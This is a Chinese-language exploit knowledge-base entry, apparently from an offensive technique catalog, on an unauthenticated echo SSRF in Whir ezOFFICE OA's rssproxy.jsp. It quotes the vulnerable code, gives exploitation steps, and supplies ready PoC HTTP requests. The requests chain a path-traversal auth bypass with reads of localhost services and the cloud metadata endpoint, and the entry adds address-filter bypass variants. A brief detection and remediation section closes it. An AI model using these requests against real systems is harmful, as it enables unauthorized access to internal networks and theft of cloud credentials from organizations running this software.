---
id: web-generic-ssrf-whir-ezoffice-rssproxy-urlconnection
title: 万户OA rssproxy.jsp SSRF：rssUrl 直入 new URL().openConnection() 并回显
type: scenario
domain: web
path: web/generic/ssrf
technique: whir-ezoffice-rssproxy-urlconnection-ssrf
aliases:
- 万户OA SSRF
- ezOFFICE rssproxy.jsp
- rssUrl SSRF
- new URL openConnection
- RSS 代理读取内网
tags:
- web
- ssrf
- java
- oa
- whir
- ezoffice
- jsp
- urlconnection
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:25+08:00'
  notes: 已对照原文与 img37 核对：rssproxy.jsp 的 rssUrl 直入 new URL().openConnection() 并以 HttpURLConnection 回显；原文未给出内网读取截图，未复跑。
---

## 一句话结论

万户OA 的 `platform/portal/portlet/rssproxy.jsp` 把 `rssUrl` 参数直接传给 `new URL(rssUrl)` 并 `openConnection()` 读取响应，再把内容逐行 `out.println` 回显；未校验协议/主机/内网地址，配合鉴权绕过可未登录让服务器访问任意 HTTP(S) 地址并读取响应。

## 原理

- `rssproxy.jsp` 代码：
  ```java
  String rssUrl = request.getParameter("rssUrl");
  String charEncode = request.getParameter("charEncode");
  URL url = new URL(rssUrl);
  HttpURLConnection con = (HttpURLConnection) url.openConnection();
  InputStream in = con.getInputStream();
  BufferedReader br = new BufferedReader(new InputStreamReader(in, charEncode));
  out.clearBuffer();
  while ((line = br.readLine()) != null) { out.println(line); }
  in.close();
  con.disconnect();
  ```
- `rssUrl` 完全可控；`openConnection` 由服务器发起，可访问 127.0.0.1、内网网段、云元数据、内网管理面板等外部不可达目标。
- 响应内容被逐行打印，属于**回显型 SSRF**，可直接读取内网 HTTP 响应（不只是盲探测）。
- 由于强制转换为 `HttpURLConnection`，主要支持 `http://`/`https://`；其他协议会因类型转换/协议处理器不同而失败（原文称“可惜了点”）。
- 页面位于 `/defaultroot/` 下，正常需登录，但可配合 `SetCharacterEncodingFilter` 的鉴权绕过未授权访问。

## 触发条件

- 目标为万户OA/ezOFFICE，`platform/portal/portlet/rssproxy.jsp` 存在。
- 能使用鉴权绕过路径到达 JSP。
- 目标可出网到攻击者地址，或可访问内网 HTTP 服务/云元数据。
- `charEncode` 可指定响应编码（如 UTF-8/GBK），不影响 SSRF 本身。

## 利用步骤

1. 用鉴权绕过前缀访问 `rssproxy.jsp?rssUrl=http://127.0.0.1:<port>/`，观察响应是否为内网服务内容。
2. 探测内网常见端口/管理路径、云元数据 `http://169.254.169.254/latest/meta-data/`、内部 API。
3. 用 `charEncode` 调整编码；若目标响应为二进制/大文件，注意读取行为。
4. 结合内网服务漏洞或读取到的凭据进一步利用；记录请求与响应作为证据。

## PoC

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/portal/portlet/rssproxy.jsp?rssUrl=http://127.0.0.1:8080/&charEncode=UTF-8 HTTP/1.1
Host: target
```

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/portal/portlet/rssproxy.jsp?rssUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target
```

原文仅给出代码与 `rssUrl` 参数，未给出实际内网读取截图。

## 变体与关联

- 变体：`http://`/`https://` 下用重定向、DNS rebinding、十进制/八进制 IP、IPv6 映射绕过可能的地址过滤（本代码无过滤）。
- 变体：读取内网 HTTP 服务的 API/管理页面；若目标返回 JSON/XML，可作为进一步利用的凭据来源。
- 关联：鉴权绕过 [[web-generic-auth-whir-ezoffice-characterencoding-filter-bypass]]；通用回显 SSRF [[web-generic-ssrf-oa-getrawfile-weak-blacklist]]、[[web-generic-ssrf-avatar-urlopen-internal-service]]。
- 边界：目标不出网且无内网可达目标、`HttpURLConnection` 因协议/证书失败、或 JSP 被删除时利用不成立。

## 检测与防御

- 检测：`rssUrl` 参数指向 127.0.0.1、私网段、169.254.169.254、非常规端口；`rssproxy.jsp` 响应包含内网页面/云元数据特征；应用进程异常出站 HTTP。
- 修复：RSS 代理只允许白名单域名/协议，解析 DNS 后阻断私网/回环/链路本地地址，连接时校验实际 IP；禁止跟随重定向或逐跳校验。
- 加固：限制出站网络；对代理接口做鉴权与速率限制；不回显原始响应体，或只返回必要的解析后字段。
